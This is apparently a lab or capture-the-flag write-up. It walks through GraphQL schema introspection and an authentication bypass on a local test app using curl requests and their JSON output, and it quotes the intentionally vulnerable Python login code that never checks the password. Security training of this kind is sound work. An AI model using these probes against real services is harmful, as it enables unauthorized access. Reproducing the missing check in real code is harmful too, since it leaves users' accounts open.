# Finding the Bug

## Step 1: enumerate the schema

Send an introspection query to discover all query types and mutations:

```bash
curl -s -X POST http://127.0.0.1:8086/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name description } } mutationType { fields { name description args { name } } } } }"}'
```

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {"name": "products", "description": null},
          {"name": "product",  "description": null},
          {"name": "me",       "description": null},
          {"name": "adminPanel","description": "Admin-only endpoint"}
        ]
      },
      "mutationType": {
        "fields": [
          {
            "name": "login",
            "description": null,
            "args": [
              {"name": "username"},
              {"name": "password"}
            ]
          }
        ]
      }
    }
  }
}
```

Two things stand out: a `login` mutation that takes a username and password, and an `adminPanel` query marked "Admin-only endpoint."

## Step 2: probe the login mutation

Try to log in with the wrong password:

```bash
curl -s -X POST http://127.0.0.1:8086/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { login(username:\"alice\",password:\"wrong\") { token role flag } }"}'
```

```json
{
  "data": {
    "login": {
      "token": "tok_alice_7f3a",
      "role": "user",
      "flag": "POC{32hexchars}"
    }
  }
}
```

The wrong password succeeds. The server returns a token and flag. The `login` mutation accepted the credentials without verifying the password.

## The bug in the source

In `lab/app.py`, the `Login.mutate` method:

```python
def mutate(self, info, username, password):
    user = USERS.get(username)
    if not user:
        raise GraphQLError("User not found")
    # Bug: forgot to check the password
    return Login(token=user["token"], role=user["role"], flag=FLAG1)
```

The `password` argument is accepted but never compared to anything.
